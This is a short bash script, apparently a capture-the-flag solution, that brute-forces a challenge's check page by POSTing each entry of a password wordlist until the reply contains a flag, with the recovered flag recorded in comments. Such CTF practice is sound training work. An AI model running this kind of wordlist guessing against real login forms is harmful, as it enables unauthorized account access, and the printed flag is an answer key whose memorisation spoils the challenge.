#!/bin/bash

while read line; do
    response=$(curl -s http://web.camsctf.com/3/check.php -d "answer=$line")
    if [[ $response =~ Flag ]]; then
        echo $line
        echo $response
        break
    fi
done < passwords.txt

# {"correct":1,"reply":"Flag: nev3r_use_123456"}
# {nev3r_use_123456}
